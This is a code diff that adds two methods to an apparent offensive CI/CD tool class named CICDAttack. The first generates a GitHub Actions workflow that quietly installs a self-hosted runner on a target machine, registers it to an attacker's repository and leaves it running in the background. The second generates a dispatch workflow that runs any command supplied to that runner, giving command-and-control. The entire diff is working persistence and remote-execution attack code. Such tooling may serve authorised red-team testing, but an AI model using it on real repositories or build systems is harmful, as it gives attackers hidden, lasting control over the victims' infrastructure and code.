@@ -120,3 +120,79 @@ class CICDAttack():
         yaml_file['jobs'] = {'testing': test_job}
 
         return yaml.dump(yaml_file, sort_keys=False)
+
+    @staticmethod
+    def create_ror_yml(registration_token: str, attacker_repo: str,
+                       runner_version: str, branch_name: str):
+        """Create a workflow that installs a GitHub Actions runner on the
+        target, registered to the attacker's repo for C2.
+
+        Args:
+            registration_token (str): Runner registration token.
+            attacker_repo (str): Attacker repo in org/repo format.
+            runner_version (str): Runner release version (e.g. '2.321.0').
+            branch_name (str): Branch for on:push trigger.
+
+        Returns:
+            str: Workflow YAML contents.
+        """
+        payload = (
+            'RUNNER_NAME="gato-$(hostname)-$(date +%s)"\n'
+            'ARCH=$(uname -m)\n'
+            'case "$ARCH" in\n'
+            '  aarch64) ARCH="arm64" ;;\n'
+            '  x86_64)  ARCH="x64" ;;\n'
+            '  *)       echo "Unsupported arch: $ARCH"; exit 1 ;;\n'
+            'esac\n'
+            'RUNNER_DIR="$HOME/.gato-runner"\n'
+            'mkdir -p "$RUNNER_DIR" && cd "$RUNNER_DIR"\n'
+            f'curl -sL "https://github.com/actions/runner/releases/download/'
+            f'v{runner_version}/actions-runner-linux-$ARCH-'
+            f'{runner_version}.tar.gz" -o runner.tar.gz\n'
+            'tar xzf runner.tar.gz && rm runner.tar.gz\n'
+            'DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1 ./config.sh'
+            f' --url "https://github.com/{attacker_repo}"'
+            f' --token "{registration_token}"'
+            ' --name "$RUNNER_NAME"'
+            ' --labels "gato-ror"'
+            ' --disableupdate'
+            ' --unattended\n'
+            'nohup ./run.sh > /dev/null 2>&1 &\n'
+            'echo "RoR runner installed: $RUNNER_NAME"'
+        )
+
+        return CICDAttack.create_push_yml(payload, branch_name)
+
+    @staticmethod
+    def create_c2_dispatch_yml():
+        """Create a workflow_dispatch workflow for C2 command execution.
+
+        Returns:
+            str: Workflow YAML contents.
+        """
+        yaml_file = {
+            'name': 'C2',
+            'on': {
+                'workflow_dispatch': {
+                    'inputs': {
+                        'command': {
+                            'description': 'Command to execute',
+                            'required': True
+                        }
+                    }
+                }
+            },
+            'jobs': {
+                'run': {
+                    'runs-on': ['self-hosted', 'gato-ror'],
+                    'steps': [
+                        {
+                            'name': 'Execute',
+                            'run': '${{ github.event.inputs.command }}'
+                        }
+                    ]
+                }
+            }
+        }
+
+        return yaml.dump(yaml_file, sort_keys=False)
